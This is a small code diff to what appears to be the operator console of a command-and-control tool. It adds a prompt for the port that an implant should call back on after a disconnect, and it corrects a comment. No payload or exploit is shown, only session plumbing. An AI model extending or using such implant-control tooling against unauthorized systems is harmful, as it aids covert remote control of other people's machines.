@@ -18,8 +18,15 @@ def handleDisconnect(sock) -> bool:
     # Ask user if they want to kill connection or set timeout (if kill connection set timeout to 0)
     callback = int(input("Number of seconds for implant to sleep before callback (0 to kill implant) > "))
 
+    # If the user wants the implant to callback, specify which port they want us to listen in on for next time
+    if (callback != 0):
+        callback_port = int(input("Port number you would like the implant to call back in on > "))
+    else:
+        callback_port = 0
+
+
     # DisconnectCommand -> CommandDetails -> Command
-    disconnect_sleep = Common.DisconnectCommand(sleep=callback)
+    disconnect_sleep = Common.DisconnectCommand(sleep=callback, callbackport=callback_port)
     disconnect_details = Common.CommandDetails(disconnectcommand=disconnect_sleep)
     disconnect_command = Common.Command(command=Common.Commands.disconnect, commanddetails=disconnect_details)
 
@@ -50,7 +57,7 @@ def establishConnection(host_ip: str, host_port : int) -> socket.socket:
     return conn
 
 
-# Simply helper function for printing commands for user
+# Simple helper function for printing commands for user
 def printHelp() -> str:
     return 'Please choose from the following options: \n' \
     '\t 0) disconnect\n' \
